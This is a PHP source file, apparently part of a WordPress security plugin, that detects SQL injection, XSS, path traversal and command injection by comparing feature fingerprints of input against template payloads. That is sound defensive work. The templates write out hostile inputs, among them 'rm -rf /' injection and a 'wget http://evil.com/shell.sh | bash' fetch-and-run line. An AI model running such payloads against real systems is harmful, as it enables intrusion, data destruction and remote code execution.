<?php
/**
 * 攻击模式泛化库
 * 职责：把已知攻击抽象成语义结构模板，通过结构特征相似度比较来识别攻击变体，
 *       而非简单的字符串/正则匹配。这是在没有AI模型情况下的"泛化能力"替代方案。
 *
 * 核心思想：每个攻击模式提取一组"结构特征指纹"，新payload提取特征后与模板比较，
 *           计算结构相似度。相似度超过阈值则判定为同类攻击。
 */
defined('ABSPATH') || exit;

class AttackPatternLibrary {

    private static $patterns = null;

    public static function init(): void {
        if (self::$patterns !== null) return;

        self::$patterns = [
            'sql_injection' => self::buildSqlPatterns(),
            'xss'           => self::buildXssPatterns(),
            'path_traversal'=> self::buildPathTraversalPatterns(),
            'command_injection' => self::buildCommandInjectionPatterns(),
        ];
    }

    public static function match(string $payload, string $decodedPayload = ''): array {
        self::init();

        $results = [];
        $payloadFeatures = self::extractFeatures($decodedPayload ?: $payload);

        foreach (self::$patterns as $attackType => $patterns) {
            $maxSimilarity = 0;
            $bestMatch = null;

            foreach ($patterns as $pattern) {
                $sim = self::calculateSimilarity($payloadFeatures, $pattern['features']);
                if ($sim > $maxSimilarity) {
                    $maxSimilarity = $sim;
                    $bestMatch = $pattern;
                }
            }

            if ($maxSimilarity >= 0.5) {
                $results[] = [
                    'attack_type'  => $attackType,
                    'similarity'   => $maxSimilarity,
                    'pattern_name' => $bestMatch['name'] ?? 'unknown',
                    'confidence'   => $maxSimilarity >= 0.8 ? 'high' : ($maxSimilarity >= 0.65 ? 'medium' : 'low'),
                ];
            }
        }

        usort($results, function($a, $b) { return $b['similarity'] <=> $a['similarity']; });

        return [
            'matches'        => $results,
            'best_match'     => $results[0] ?? null,
            'features'       => $payloadFeatures,
            'is_attack_like' => !empty($results) && $results[0]['similarity'] >= 0.6,
        ];
    }

    public static function extractFeatures(string $payload): array {
        $features = [
            'length'          => strlen($payload),
            'special_ratio'   => self::specialCharRatio($payload),
            'quote_count'     => substr_count($payload, "'") + substr_count($payload, '"'),
            'paren_count'     => substr_count($payload, '(') + substr_count($payload, ')'),
            'bracket_count'   => substr_count($payload, '<') + substr_count($payload, '>'),
            'semicolon_count' => substr_count($payload, ';'),
            'pipe_count'      => substr_count($payload, '|'),
            'slash_count'     => substr_count($payload, '/'),
            'backslash_count' => substr_count($payload, '\\'),
            'dotdot_count'    => substr_count($payload, '..'),
            'space_ratio'     => substr_count($payload, ' ') / max(1, strlen($payload)),
            'eq_count'        => substr_count($payload, '='),
            'has_or_keyword'  => (int)preg_match('/\bOR\b/i', $payload),
            'has_and_keyword' => (int)preg_match('/\bAND\b/i', $payload),
            'has_union'       => (int)preg_match('/\bUNION\b/i', $payload),
            'has_select'      => (int)preg_match('/\bSELECT\b/i', $payload),
            'has_script'      => (int)preg_match('/<script/i', $payload),
            'has_img'         => (int)preg_match('/<img/i', $payload),
            'has_onerror'     => (int)preg_match('/onerror/i', $payload),
            'has_onload'      => (int)preg_match('/onload/i', $payload),
            'has_javascript'  => (int)preg_match('/javascript:/i', $payload),
            'has_eval'        => (int)preg_match('/eval\s*\(/i', $payload),
            'has_alert'       => (int)preg_match('/alert\s*\(/i', $payload),
            'has_backtick'    => substr_count($payload, '`') > 0 ? 1 : 0,
            'has_dollar_paren' => strpos($payload, '$(') !== false ? 1 : 0,
            'has_double_dash' => strpos($payload, '--') !== false ? 1 : 0,
            'has_hash_comment'=> strpos($payload, '#') !== false ? 1 : 0,
            'has_like'        => (int)preg_match('/\bLIKE\b/i', $payload),
            'has_into'        => (int)preg_match('/\bINTO\b/i', $payload),
            'has_from'        => (int)preg_match('/\bFROM\b/i', $payload),
            'has_where'       => (int)preg_match('/\bWHERE\b/i', $payload),
            'keyword_density' => self::keywordDensity($payload),
            'tag_count'       => preg_match_all('/<[a-zA-Z]/', $payload),
            'attr_count'      => preg_match_all('/\s[a-zA-Z-]+=/', $payload),
            'has_etc_passwd'  => (int)preg_match('/\/etc\/passwd/i', $payload),
            'has_etc_shadow'  => (int)preg_match('/\/etc\/shadow/i', $payload),
            'has_htaccess'    => (int)preg_match('/\.htaccess/i', $payload),
            'has_config_php'  => (int)preg_match('/config\.php/i', $payload),
            'has_rm'          => (int)preg_match('/\brm\s+-/i', $payload),
            'has_cat'         => (int)preg_match('/\bcat\s+/i', $payload),
            'has_wget'        => (int)preg_match('/\bwget\b/i', $payload),
            'has_curl'        => (int)preg_match('/\bcurl\b/i', $payload),
            'has_bash'        => (int)preg_match('/\bbash\b/i', $payload),
            'has_pipe_chain'  => (int)preg_match('/\|\s*[a-z]/i', $payload),
            'base64_like'     => self::looksLikeBase64($payload),
            'hex_like'        => self::looksLikeHex($payload),
            'has_percent_enc' => (int)preg_match('/%[0-9a-fA-F]{2}/', $payload),
            'has_unicode_enc' => (int)preg_match('/%u[0-9a-fA-F]{4}/i', $payload),
        ];

        return $features;
    }

    private static function calculateSimilarity(array $f1, array $f2): float {
        $totalWeight = 0;
        $matchWeight = 0;

        $weights = [
            'has_or_keyword' => 5, 'has_and_keyword' => 5,
            'has_union' => 6, 'has_select' => 6,
            'has_script' => 8, 'has_img' => 4,
            'has_onerror' => 6, 'has_javascript' => 7,
            'has_eval' => 7, 'has_alert' => 5,
            'has_backtick' => 6, 'has_dollar_paren' => 6,
            'has_double_dash' => 4, 'has_etc_passwd' => 8,
            'has_etc_shadow' => 9, 'dotdot_count' => 6,
            'has_rm' => 8, 'has_cat' => 5,
            'has_wget' => 7, 'has_curl' => 7,
            'has_bash' => 8, 'semicolon_count' => 5,
            'pipe_count' => 5, 'tag_count' => 5,
            'has_like' => 3, 'has_where' => 4,
            'has_from' => 4, 'has_config_php' => 7,
            'quote_count' => 4, 'paren_count' => 3,
            'has_pipe_chain' => 6, 'special_ratio' => 4,
            'keyword_density' => 5, 'has_htaccess' => 6,
        ];

        foreach ($f1 as $key => $val1) {
            if (!isset($f2[$key])) continue;

            $val2 = $f2[$key];
            $weight = $weights[$key] ?? 1;

            if (is_bool($val1) || is_int($val1)) {
                if ($val1 == $val2 && $val1 > 0) {
                    $matchWeight += $weight;
                }
                if ($val1 > 0 || $val2 > 0) {
                    $totalWeight += $weight;
                }
            } elseif (is_numeric($val1) && is_numeric($val2)) {
                $maxVal = max(abs($val1), abs($val2), 1);
                $diff = abs($val1 - $val2);
                $sim = 1 - min(1, $diff / $maxVal);
                $matchWeight += $sim * $weight;
                $totalWeight += $weight;
            }
        }

        return $totalWeight > 0 ? $matchWeight / $totalWeight : 0;
    }

    private static function buildSqlPatterns(): array {
        return [
            [
                'name' => 'or_tautology',
                'features' => self::extractFeatures("1' OR '1'='1"),
            ],
            [
                'name' => 'union_select',
                'features' => self::extractFeatures("' UNION SELECT 1,2,3--"),
            ],
            [
                'name' => 'blind_time',
                'features' => self::extractFeatures("1' AND SLEEP(5)--"),
            ],
            [
                'name' => 'error_based',
                'features' => self::extractFeatures("1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"),
            ],
            [
                'name' => 'boolean_blind',
                'features' => self::extractFeatures("1' AND 1=2--"),
            ],
            [
                'name' => 'arithmetic_tautology',
                'features' => self::extractFeatures("5-5=0"),
            ],
        ];
    }

    private static function buildXssPatterns(): array {
        return [
            [
                'name' => 'img_onerror',
                'features' => self::extractFeatures('<img src=x onerror=alert(1)>'),
            ],
            [
                'name' => 'script_tag',
                'features' => self::extractFeatures('<script>alert(1)</script>'),
            ],
            [
                'name' => 'javascript_protocol',
                'features' => self::extractFeatures('<a href="javascript:alert(1)">'),
            ],
            [
                'name' => 'svg_onload',
                'features' => self::extractFeatures('<svg onload=alert(1)>'),
            ],
            [
                'name' => 'body_onload',
                'features' => self::extractFeatures('<body onload=alert(1)>'),
            ],
            [
                'name' => 'eval_string',
                'features' => self::extractFeatures("eval('alert(1)')"),
            ],
        ];
    }

    private static function buildPathTraversalPatterns(): array {
        return [
            [
                'name' => 'simple_etc_passwd',
                'features' => self::extractFeatures('../../../etc/passwd'),
            ],
            [
                'name' => 'url_encoded',
                'features' => self::extractFeatures('..%2f..%2f..%2fetc%2fshadow'),
            ],
            [
                'name' => 'double_encoded',
                'features' => self::extractFeatures('%252e%252e%252fetc%252fpasswd'),
            ],
            [
                'name' => 'windows_boot_ini',
                'features' => self::extractFeatures('..\\..\\..\\Windows\\win.ini'),
            ],
            [
                'name' => 'web_config',
                'features' => self::extractFeatures('../../config.php'),
            ],
        ];
    }

    private static function buildCommandInjectionPatterns(): array {
        return [
            [
                'name' => 'semicolon_cat',
                'features' => self::extractFeatures('127.0.0.1; cat /etc/passwd'),
            ],
            [
                'name' => 'pipe_ls',
                'features' => self::extractFeatures('127.0.0.1 | ls -la'),
            ],
            [
                'name' => 'backtick_id',
                'features' => self::extractFeatures('`id`'),
            ],
            [
                'name' => 'dollar_paren',
                'features' => self::extractFeatures('$(whoami)'),
            ],
            [
                'name' => 'and_rm',
                'features' => self::extractFeatures('127.0.0.1 && rm -rf /'),
            ],
            [
                'name' => 'wget_pipe_bash',
                'features' => self::extractFeatures('wget http://evil.com/shell.sh | bash'),
            ],
            [
                'name' => 'sleep_blind',
                'features' => self::extractFeatures('127.0.0.1; sleep 5'),
            ],
        ];
    }

    private static function specialCharRatio(string $s): float {
        $len = max(1, strlen($s));
        $special = preg_match_all('/[^a-zA-Z0-9\s]/', $s);
        return $special / $len;
    }

    private static function keywordDensity(string $s): float {
        $len = max(1, strlen($s));
        $keywords = preg_match_all('/\b(OR|AND|UNION|SELECT|FROM|WHERE|INSERT|UPDATE|DELETE|DROP|EXEC|SCRIPT|EVAL|ALERT|ONERROR|ONLOAD|JAVASCRIPT)\b/i', $s);
        return $keywords / $len * 100;
    }

    private static function looksLikeBase64(string $s): int {
        $s = trim($s);
        if (strlen($s) < 20) return 0;
        if (preg_match('/^[A-Za-z0-9+\/=]+$/', $s) && strlen($s) % 4 === 0) return 1;
        return 0;
    }

    private static function looksLikeHex(string $s): int {
        $s = trim($s);
        if (strlen($s) < 10) return 0;
        if (preg_match('/^[0-9a-fA-F]+$/', $s)) return 1;
        return 0;
    }
}
